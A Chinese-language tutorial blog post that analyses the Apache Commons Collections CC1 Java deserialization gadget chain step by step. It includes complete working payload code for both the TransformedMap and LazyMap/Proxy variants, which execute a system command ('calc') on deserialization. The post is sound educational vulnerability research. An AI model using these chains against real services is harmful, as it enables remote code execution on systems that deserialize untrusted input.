---
title: JAVA安全:CC1链
---

*作者：Narcher*	*时间：2024/2/23*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

开始之前，我们先了解一下正射和反射。

JAVA中，如果我们要调用起计算器，正常的命令执行为：

```java
Runtime.getRuntime().exec("calc");
```

但上边使用的是正射，是无法序列化写入文件中的，如果要存入文件，我们需要利用反射来实现：

```java
Runtime r = Runtime.getRuntime();//实例化Runtime类
Class c = r.getClass();//获取类原型，这里和正射不同，方法从类中获取
Method m = c.getMethod("exec",String.class);//从类中获取exec方法
m.invoke(r,"calc");//相当于r.exec("calc")
```

所谓的CC链，实际上就是针对Apache Commons Collections组件的payload，其核心便是利用JAVA的反射机制来调用任意函数。



## 正文

针对JAVA的反序列化漏洞，思路大致和php的反序列化漏洞一致，就是从终点往前找，首先确定一个调用了危险方法的类，并且继承了序列化接口，然后逐步溯源，直到找到一个重写了readObject方法的类，并且符合条件，那么就成功了。

下面我们以CC1链为例，进行分析。

### 1.终点--InvokerTransformer类

CC1链的源头便是InvokerTransformer类，关键在于其构造器和继承了Transformer接口的transform方法，我们来看一下它的源码：

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

从构造器中可以得知其三个参数都是可以控制的，而方法transform是不是有点眼熟？没错，这就是在**前言**中讲到的反射。

我们尝试利用InvokerTransformer类执行之前的命令：

```java
        Runtime r = Runtime.getRuntime();
//        Class c = r.getClass();
//        Method m = c.getMethod("exec",String.class);
//        m.invoke(r,"calc");上边这三行注释的代码由下边这两行代替
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        invokerTransformer.transform(r);
```

执行上述代码，发现成功弹出计算器。

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708589373352.png" alt="1708589373352" style="zoom: 33%;" />

这样，终点就找到了，我们便需要进行溯源，寻找上一站。

### 2.溯源

#### 2.1 TransformedMap类

我们向上找能够利用transform方法的类：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708589730280.png" alt="1708589730280" style="zoom:50%;" />

发现有很多，于是便一个个点开查看，最终发现LazyMap，TransformedMap和DefaultedMap存在利用点，我们先只看TransformedMap这个类。

```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {//构造器
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}

protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);//我们只需要让valueTransformer为InvokerTransformer即可
}
```

然而，TransformerMap的checkSerValue方法以及其构造器都是protected类型的，只能在内部访问，因此我们需要找一个使其实例化的方法，紧接着便看到了TransformedMap中public属性的decorate方法：

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

因此我们可以利用TransformedMap类的decorate方法，让其实例化，之后再想办法触发checkSetValue方法。

#### 2.2 Map遍历

我们查找调用过checkSetValue方法的地方，发现TransformedMap的父类AbstractInputCheckedMapDecorator恰好调用了该方法，且其中的setValue方法为public类型

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708591216806.png" alt="1708591216806" style="zoom: 50%;" />

```java
static class MapEntry extends AbstractMapEntryDecorator {//AbstractInputCheckedMapDecorator的副类MapEntry
    
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

而MapEntry继承了AbstractMapEntryDecorator类，AbstractMapEntryDecorator类中继承了Map.Entry接口，可进行Map遍历

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708592608901.png" alt="1708592608901" style="zoom: 80%;" />

因此我们通过Map遍历时即可调用TransformedMap的父类AbstractInputCheckedMapDecorator中的setValue方法来触发TransformedMap中的checkSetValue方法。

```java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
HashMap<Object,Object> map = new HashMap<>();
map.put("key","value");
Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,invokerTransformer);
for(Map.Entry entry:transformedmap.entrySet()){
    entry.setValue(r);//相当于InvokerTransformer.transform(r)
}
```

执行上述代码即可弹出计算器，然而，溯源还未结束，我们接着找调用了setValue方法的类。

#### 2.3 起点--AnnotationInvocationHandler类

经查找可得：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708594017228.png" alt="1708594017228" style="zoom: 80%;" />

该类中调用setValue方法的代码如下：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708593715301.png" alt="1708593715301" style="zoom:50%;" />

两个if语句，第一个if判断注解中是否有成员变量，第二个if判断是否能够强转。

可见此类中利用的setValue方法恰好写在readObject方法中，只要我们能够控制里边的参数，便可大功告成。

于是我们去找该类的构造器：

```java
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
    //需要传入两个参数，第一个参数是一个类对象，表示注解的类型；第二个参数需要传入Map，因此传入TransformedMap即可
    Class<?>[] superInterfaces = type.getInterfaces();
    if (!type.isAnnotation() ||
        superInterfaces.length != 1 ||
        superInterfaces[0] != java.lang.annotation.Annotation.class)
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    this.type = type;
    this.memberValues = memberValues;
}
```

接下来第一个参数的构造需要符合这几个if条件，首先，需要是注解类型；其次，内部需要有成员变量，以便在for循环的Map遍历中通过。

像常见的Override注解：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708596244709.png" alt="1708596244709" style="zoom: 67%;" />

不包含任何成员变量。

因此，我们选用Target注解：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708596567789.png" alt="1708596567789" style="zoom: 67%;" />

与此同时，更改map.put("value","value")，使其memberType不为空。

但还有一个问题，那就是AnnotationInvocationHandler类并没有public属性，因此仅能够在sun.reflect.annotation这个包下边调用，因此我们就需要用到**反射**来实现外部调用。

经过上述溯源，我们成功找到了一条链，接下来我们需要将其以代码形式串联起来。

### 3.构造链

#### 3.1 反射获取Runtime实例

Runtime是单例类，且不继承Seralizeable接口，无法在序列化时写入文件，而它的原型类Class则继承了Seralizeable接口，因此我们使用反射获取其原型类。

```java
Class rc=Class.forName("java.lang.Runtime");                 //获取类原型
Method getRuntime = rc.getDeclaredMethod("getRuntime",null);
Runtime r = (Runtime) getRuntime.invoke(null,null);
Method exec = rc.getDeclaredMethod("exec",String.class);
exec.invoke(r,"calc");
```

这样便可实现序列化，我们采用InvokerTransformer类的transform方法实现上述过程：

```java
Class rc = Class.forName("java.lang.Runtime");
Method getRuntime = (Method)new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
Runtime r = (Runtime) new InvokerTransformer("getRuntime",new Class[]{Object.class,Object.class},new Object[]{null,null}).transform(getRuntime);
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
```

#### 3.2 使用ChainedTransformer类简化过程

```java
public ChainedTransformer(Transformer[] transformers) {
    super();
    iTransformers = transformers;
}

public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

ChainedTransformer类中存在的transform方法类似于递归调用，因此我们可以以数组的形式传入InvokerTransformer类的transform方法实现的获取Runtime实例的过程，故更改代码如下：

```java
Transformer[] transformers=new Transformer[]{
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class);
```

然而，在实际的环境中，我们不可能直接调用chainedTransformer的transform方法来传入Runtime.class。因此，我们需要将Runtime.class作为递归的开头传入进去，而直接传入是不可能的，我们需要一个类来作为载体。与此同时，我们还忽略了一个问题，那就是AnnotationInvocationHandler类中的setValue参数不可控。

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708593715301-17086786454132.png" alt="1708593715301" style="zoom:50%;" />

#### 3.3 ConstantTransformer类的引入

先来看一下该类的源码：

```java
public ConstantTransformer(Object constantToReturn) {//构造器
    super();
    iConstant = constantToReturn;
}

public Object transform(Object input) {//transform方法
    return iConstant;
}
```

该类的transform方法很有意思，无论传入何值，均会返回构造时传入的常量，因此，我们可以直接将Transformer数组改成如下：

```java
Transformer[] transformers=new Transformer[]{
    	new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
```

#### 3.4 构造完成

完整的CC1链如下所示：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,chainedTransformer);
//反射获取AnnotationInvocationHandler类
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
constructor.setAccessible(true);
Object o = constructor.newInstance(Target.class,transformedmap);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
oos.writeObject(o);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
ois.readObject();
```

成功执行便会弹出计算器：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708676697477.png" alt="1708676697477" style="zoom:50%;" />

### 4.思路转换

本次分析的CC1链是国内基于TransformerMap类的链，而我们常用的ysoserial中的则是国外基于LazyMap的链，其思路如下：

<img src="JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/1708679064221.png" alt="1708679064221" style="zoom: 67%;" />

payload也和之前的类似，不过是将TransformerMap改为了LazyMap，利用方法由checkSetValue变为了get，并多了一步Proxy触发invoke方法，至于注解类型，由于我们利用的是get方法，所以不需要进入if，直接随便传一个注解就可以了。最后使用AnnotationInvocationHandler类进行包装，毕竟我们需要使用它的readObject方法进行反序列化。

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
//反射获取AnnotationInvocationHandler类
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
oos.writeObject(handler);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC1.txt"));
ois.readObject();
```
